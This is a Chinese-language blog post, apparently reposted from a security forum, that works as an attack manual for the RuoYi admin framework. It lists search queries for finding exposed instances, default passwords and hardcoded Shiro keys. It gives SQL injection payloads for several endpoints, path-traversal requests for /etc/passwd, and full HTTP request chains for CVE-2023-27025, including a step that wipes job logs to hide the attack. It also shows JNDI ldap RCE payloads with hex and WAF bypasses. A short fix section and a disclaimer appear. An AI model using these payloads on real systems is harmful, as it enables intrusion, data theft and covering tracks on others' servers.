#  若依(RuoYi)框架漏洞战争手册  
Locks_
                    Locks_  泷羽Sec-track   2026-01-15 14:39  
  
>   
> 声明！本文章所有的工具分享仅仅只是供大家学习交流为主，切勿用于非法用途，如有任何触犯法律的行为，均与本人及团队无关！！！  
  
  
**往期推荐：**  
  
**白嫖超级会员｜寒假弯道超车，好靶场喊你学习啦**  
  
**【工具】多平台GUI图形化资产测绘工具，支持一键导出**  
  
**公众号：**  
  
  
****  
文章转载至补天社区  
```
作者：Locks_https://forum.butian.net/share/4328
```  
  
当你在用若依时，黑客已经在用Shiro默认密钥弹你的Shell；当你还在纠结分页查询，攻击者已通过SQL注入接管数据库；而你以为安全的定时任务，不过是他们拿捏服务器的玩具。这份手册，带你用渗透的视角，解剖若依的每一处致命弱点——因为真正的安全，始于知晓如何毁灭它。  
# 0x00 前言  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSTG89186R2pIdsPlBCbRRRI7l7tbFeKk8PkaGm6faRzBHagvKv6ttgA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 简介  
  
Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。  
  
若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCS9icpkD7OQlkNc5wSCEicaFKYZuYauwGcibguEo1RuEX4pYX98KpchicoGw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 配合ruoyi的服务：  
```
alibaba druid          alibaba nacos          spring            redis            mysql            minio            fastjson            shiro            swagger-ui.html          mybatis
```  
## 搜索语法  
  
FOFA：  
```
(icon_hash="-1231872293" || icon_hash="706913071")
```  
  
Hunter：  
```
web.body="若依后台管理系统"
```  
## 环境搭建  
  
新建文件夹，拉起ruoyi源码  
```
git clone https://gitee.com/y_project/RuoYi
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSOPmjzztfu8ia7IenRE7tWOicL1t1dTg8icpzJOFlMu3uhpml8dG5quxvQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
cd RuoYi 切换版本git tag -l切换git checkout v4.5.1
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSJianibRxNbRRkRbCh0icrkTicgtC0kibJY3yBiaBMDibia5n9mpiboABBhLZfOg/640?wx_fmt=png&from=appmsg "")  
接下来用idea搭建的 mysql正常用phpstudy搭建就行 日志存放路径需要修改  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSn1IrKr1LWTxqIsliapzhM9otb6I17RSaNicr8BmbkmOzrPTvg2gz0LcQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
配置mysql  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCScWELX8nYkJk06gmX7MwBhHichSVxP0NIwnWsPIVTH2dxZd9mPpFjxOw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSedEkjN0oYOxV5bG4l9QDoianib8xJ9wBChRlNIe7gHYTdyHkXa3Z8KpA/640?wx_fmt=png&from=appmsg "")  
启动即可，默认端口80  
# 0x01 弱口令  
```
用户：admin ruoyi druid            密码：123456 admin druid admin123 admin888
```  
# 0x02 Shiro默认密钥  
## 漏洞简介  
  
若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。  
## 影响版本  
  
RuoYi<V-4.6.2  
## 漏洞复现  
  
在配置文件中，能够看到shiro的密钥是在配置文件中的  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSJ1CrmlakMzUcljibpVeZZSfyufJnicDfZPKGZMmaqnBI6icATRXR3raPA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
漏洞利用工具地址 https://github.com/SummerSec/ShiroAttack2  
- RuoYi-4.2版本使用的是shiro-1.4.2在该版本和该版本之后都需要勾选AES GCM模式。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSl5Sv4wPPXicSeShYXknvtl7wESPrKoVARbtjWN1rceib2JszOexibdauA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSKEwiaQg2hhlp9Tuqb3OfPuX1FZqgxMJljfp9YrUY3l8CHO6ejecghHQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;font-weight: bold;background: rgb(240, 240, 240) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;text-align: left;"><section><span leaf="">RuoYi 版本号</span></section></th><th style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;font-weight: bold;background: rgb(240, 240, 240) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;text-align: left;"><section><span leaf="">对象版本的默认AES密钥</span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;text-align: left;"><section><span leaf="">4.6.1-4.3.1</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;text-align: left;"><section><span leaf="">zSyK5Kp6PZAAjlT+eeNMlg==</span></section></td></tr><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;text-align: left;"><section><span leaf="">3.4-及以下</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;text-align: left;"><section><span leaf="">fCq+/xW488hMTCD+cmJ3aQ==</span></section></td></tr></tbody></table>  
- RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本以后,在没有获取到密钥的请情况下无法再进行利用。  
  
# 0x03 SQL注入  
### 注入点1 /role/list接口 （<V-4.6.2）  
  
版本同上4.5.1 首先从源码分析一波 Mybatis配置一般用#{}，类似PreparedStatement的占位符效果，可以防止SQL注入。RuoYi则是采用了${}造成了SQL注入  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSw7GiajumFUB3SkYMuaFLEKUgwykLsxAZeW6xEpy9xPImOCVhVM8yYCg/640?wx_fmt=png&from=appmsg "")  
跳转  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSnvtP6sIZyKb4lx6ribiakLQdSlohVzyvlxicaicgzv4jWdQJOXddza6gxA/640?wx_fmt=png&from=appmsg "")  
解释一下 ${params.dataScope}  
  
${params.dataScope}  
这段代码是MyBatis的动态SQL之一，主要用于在SQL查询中嵌入外部定义的字符串或参数。这里的${...}  
语法表示取出params  
对象中名为dataScope  
的属性值，并将其直接嵌入到SQL语句中。  
```
例如，在一个基于角色权限管理的系统中，不同的用户可能有权限查看不同的数据记录。管理员可能可以查看所有部门的记录，而普通用户只能查看自己部门的记录。在这种情况下，`dataScope`的值可以是一个根据用户角色动态生成的SQL片段，如`"AND dept_id IN (SELECT dept_id FROM user_dept_access WHERE user_id = #{userId})"`，用以限定查询结果只包含特定部门的用户信息。
```  
  
可以看到，在查询的时候，user的属性params是map，在xml中，将dataScope拼接到sql语句后  
  
进入mapper层  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSlrYC1Ko85YiczO97W2eBj5uzQdFo7AK9kqWOzHH1TrK0iaERWLUE6NFw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
跳转到上级  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSE47grMCLsAUlBeGKdSwficBBH0OqhxiadMAiaeE8P6z3AqS4gibm7c2Rpg/640?wx_fmt=png&from=appmsg "")  
进入role查看信息  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSaFXjZmG2WmBeibn33sicwbzh8zO7rOpe5jqjolOxSUZTn8m4Pd64u8nw/640?wx_fmt=png&from=appmsg "")  
查看功能  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSnFhPiaggqOHWvzuQohE2KFMooVian60LaOoG04mbgBUyWg51B8wjH7Ag/640?wx_fmt=png&from=appmsg "")  
params  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSGYWdicYE4nHvLwajHol8sFE3BW7MfsZ7ZMZadRSvgUJGo1wfiabw4icicg/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSEajyLzRAAgoMdMpSLwiaFYnx71p0S7z9EYTxPXX7pFO0W2yKn695J6Q/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
根据路径  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSpYtu5Uo9ibBicdwibict1BsdYOtwvteU5dvj7Rgn2PIAl0gz57xRFE2xNQ/640?wx_fmt=png&from=appmsg "")  
执行代码  
```
&params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSEUficxfA35YG47mqhhGDG4y3mJ68V10wgkmbfTs8MQdeY5kwcC1wNiag/640?wx_fmt=png&from=appmsg "")  
  
image.png  
### 注入点2 /role/export （<V-4.6.2）  
### 注入点3 /user/list （<V-4.6.2）  
### 注入点4 /user/list （<V-4.6.2）  
### 注入点5 /dept/list （<V-4.6.2）  
### 注入点6 /role/authUser/allocatedList （<V-4.6.2）  
### 注入点7 /role/authUser/unallocatedList  
### 注入点8 /dept/edit （<V-4.6.2）  
```
DeptName=xxxxxxxxxxx&DeptId=100&ParentId=555&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat(0,(select user()))));#
```  
### 注入点9 /tool/gen/createTable（V-4.7.1-V-4.7.5）  
  
参考https://blog.takake.com/posts/7219/#2-3-10-%E6%80%BB%E7%BB%93  
# 0x04 CNVD-2021-01931任意文件下载  
#### 漏洞简介  
  
登录后台后可以读取服务器上的任意文件。  
#### 影响版本：  
  
RuoYi<4.5.1  
#### 漏洞复现  
  
用4.5.0版本 直接搜索关键字，download找到具体的controller 路径  
```
/common/download/resource/common/download/resource?resource=/profile/../../../../etc/passwd/common/download/resource?resource=/profile/../../../../Windows/win.ini
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSULDTzUnPRXiaIwE6ubhLXqvPmbUmf3jpdmDQVN5ARHibdeZAib2Px0plw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
# 0x05 CVE-2023-27025 若依任意文件下载  
## 漏洞简介  
  
该漏洞是若依（RuoYi）4.7.6 版本中存在的 **权限绕过 + 任意文件下载**  
 组合漏洞。攻击者通过后台管理接口添加恶意定时任务，修改系统配置文件路径，绕过下载功能的白名单限制，最终实现任意文件下载。漏洞本质是 **权限控制缺失**  
（允许低权限用户操作敏感接口）和 **路径校验不严**  
（未对动态修改的配置路径进行二次校验）的综合结果。  
## 影响版本  
- **若依（RuoYi）<= 4.7.6**  
  
## 利用条件  
1. **权限要求**  
：  
  
1. 攻击者需获取管理员 Cookie（如 JSESSIONID  
）或存在其他权限绕过漏洞。  
  
1. 若后台接口未授权即可访问，则漏洞危害升级为“未授权任意文件下载”。  
  
1. **系统配置**  
：  
  
1. 目标系统启用了定时任务模块（默认开启）。  
  
## 漏洞复现  
#### 添加任务绕过白名单（自定义下载文件路径）  
```
POST /monitor/job/add HTTP/1.1Host: 10.40.107.67Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 214Connection: closecreateBy=admin&jobId=161&jobName=test111&jobGroup=DEFAULT&invokeTarget=ruoYiConfig.setProfile('/Users/apple/Desktop/Locks/javafx.txt')&cronExpression=0%2F10+*+*+*+*+%3F&misfirePolicy=1&concurrent=1&status=0&remark=
```  
- 通过调用 ruoYiConfig.setProfile()  
 方法，将系统配置文件路径动态修改为攻击者指定的路径（如 /Users/apple/Desktop/Locks/javafx.txt  
）。  
  
- 此操作绕过了下载功能原本的“固定目录白名单”限制，将下载路径指向自定义位置。  
  
#### 执行定时任务（触发配置修改）  
```
POST /monitor/job/run HTTP/1.1Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Host: 10.40.107.67Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 9Connection: closejobId=117
```  
- 立即执行 jobId=117  
 对应的定时任务，触发 ruoYiConfig.setProfile()  
 方法调用，完成配置文件路径的修改。  
  
- 修改后，系统将从新的配置路径（攻击者指定路径）读取文件。  
  
#### 清理任务日志（擦除攻击痕迹）  
```
POST /monitor/jobLog/clean HTTP/1.1Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Host: 10.40.107.67Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Content-type: application/x-www-form-urlencodedContent-Length: 0Connection: close
```  
- 删除任务执行日志，避免管理员发现恶意任务记录。  
  
- 此步骤非漏洞必要环节，但常用于隐蔽攻击行为。  
  
#### 触发任意文件下载  
```
GET /common/download/resource?resource=2.txt HTTP/1.1Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1bUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36Host: 10.40.107.67Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2Connection: close
```  
- 下载功能仅校验“配置文件中的路径”，未对动态修改后的路径进行二次白名单校验。  
  
## bypass  
  
对路径参数进行 URL 编码或 Unicode 编码，绕过 WAF 检测：  
```
invokeTarget=ruoYiConfig.setProfile('%2F%65%74%63%2F%70%61%73%73%77%64')
```  
## 修复  
1. **官方补丁**  
：  
  
1. 升级若依至 **4.7.6 以上版本**  
，官方已修复权限校验和路径白名单问题。  
  
1. **代码级修复**  
：  
  
1. **权限校验**  
：对 /monitor/job/add  
 等后台接口添加严格的角色权限控制。  
  
1. **方法黑名单**  
：禁止 invokeTarget  
 参数调用敏感类方法（如 ruoYiConfig.setProfile  
）。  
  
1.   
1. **路径二次校验**  
：在下载功能中强制校验文件路径是否在合法白名单内。  
  
1. **临时缓解**  
：  
  
1. 禁用后台任务调度功能，或限制 monitor  
 模块的访问权限。  
  
1. 部署 WAF 拦截包含 ruoYiConfig.setProfile  
 特征的请求。  
  
# 0x06 定时任务RCE  
  
由于若依后台计划任务处，对于传入的“调用目标字符串”没有任何校验，导致攻击者可以调用任意类、方法及参数触发反射执行命令。  
## 0x01 简介  
  
RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务。  
## 0x02 漏洞概述  
  
若依最新后台定时任务SQL注入可导致RCE漏洞  
## 0x03 影响版本  
  
v4.7.8  
## 0x04 环境搭建  
- RuoYi 官网地址：http://ruoyi.vip(opens new window)  
  
- RuoYi 在线文档：http://doc.ruoyi.vip(opens new window)  
  
- RuoYi 源码下载：https://gitee.com/y_project/RuoYi(opens new window)  
  
使用phpstudy启动mysql  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSxghsGFGsu5ADAO0IpU1LAe35sVRPhFfNiceNkxzzoiaffqSkXOkXicruw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
创建数据库ry  
导入sql到ry数据库中  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCS01cDcn9EW7ficXcpC90kExicZ9UMQZxjeEFxs8ly4OcpbQ6zRXmocMZQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSfwXjiaPbAsTFo2yqAbYcwZUEay0FicF4rZ1V6ZzVXw5dFqYLU4fNTzvw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSncygqSicF6qnV2yVjsWjYUTVxqA7iap3jrQhypXkbnR2GIrMY6rUQJqA/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
将ruoyi-admin下的application-druid.yml文件配置数据库账号密码  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSKibhkULXib41hwb3S6xe9T6MS3b11fHdejSj9e8oyaDtMU9hq0L97fRQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
启动成功  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSmI4RBEpFDqGnMED5O8qzgqLy9MRZZhSuRHAO21XGuU5QWrkQp5tNdQ/640?wx_fmt=png&from=appmsg "")  
若依漏洞复现环境搭建成功  
```
adminadmin123
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCS8Zofbibe7VhuQftpMx6crhIKicKzThhJoptg33EzvichCqHMjqMOdXgvw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 0x05 漏洞复现  
  
系统监控下定时任务中存在SQL注入漏洞  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSMouk8ujovx7raKIHpeI1yibprmJ2TRUEGCzuzHVdvrDxaBPTluQt3fQ/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
在补丁中，使用了黑名单和白名单的策略。  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSjUoBb17nMnjI8DIu3TWaiaQxxxNqGMN89SF9ibiaIQdxQ72nmzB75ZbYw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
SQL注入漏洞点  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSvDwzazwJrTtzzx4ADGXMyxOqRjutHC2NVibJdsvV3vRpxGH2PaicsnAw/640?wx_fmt=png&from=appmsg "")  
开始复现 RCE payload JNDI  
```
javax.naming.InitialContext.lookup('ldap://127.0.0.1:1389/deserialJackson')
```  
  
payload中可以执行反弹shell、漏洞探测、命令执行功能 DNSLOG  
```
javax.naming.InitialContext.lookup('ldap://dnslog')
```  
  
目标字符串不允许'ldap(s)'调用且不能存在括号，因此我们使用SQL注入加十六进制编码来进行绕过修改 https://www.bejson.com/convert/ox2str/  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSGmzlA6LSplibDVJv4mFwwsUXrS1fGPeqAOku74Fvjbu6IicOwwp99Tmw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
```
6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f3132372e302e302e313a313338392f646573657269616c4a61636b736f6e2729
```  
  
第一步：运行此命令 成功地绕过了它，并成功地执行  
```
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'Hack By 1ue' WHERE job_id = 1;')
```  
  
<table><thead><tr><th style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;font-weight: bold;background: rgb(240, 240, 240) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;text-align: left;"><section><span leaf=""><br/></span></section></th><th style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;font-weight: bold;background: rgb(240, 240, 240) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;text-align: left;"><section><span leaf=""><br/></span></section></th><th style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;font-weight: bold;background: rgb(240, 240, 240) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;text-align: left;"><section><span leaf=""><br/></span></section></th><th style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;font-weight: bold;background: rgb(240, 240, 240) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;text-align: left;"><section><span leaf=""><br/></span></section></th><th style="color: rgb(0, 0, 0);font-size: 14px;line-height: 1.5em;letter-spacing: 0em;font-weight: bold;background: rgb(240, 240, 240) left top no-repeat;height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;text-align: left;"><section><span leaf=""><br/></span></section></th></tr></thead><tbody><tr style="color: rgb(0, 0, 0);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: left;background-position-y: top;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;text-align: left;"><section><span leaf="">分钟</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;text-align: left;"><section><span leaf="">小时</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;text-align: left;"><section><span leaf="">日</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;text-align: left;"><section><span leaf="">月</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;text-align: left;"><section><span leaf="">星期</span></section></td></tr></tbody></table>  
```
* * * * * ?
```  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw2iboQCTYAEmGEHXIDLiaFJCSj7OVfdCC7hOzXtCjslFugWggyqNicXvg00Bib7aZtU6zHribHLZFpcSdw/640?wx_fmt=png&from=appmsg "")  
  
image.png  
  
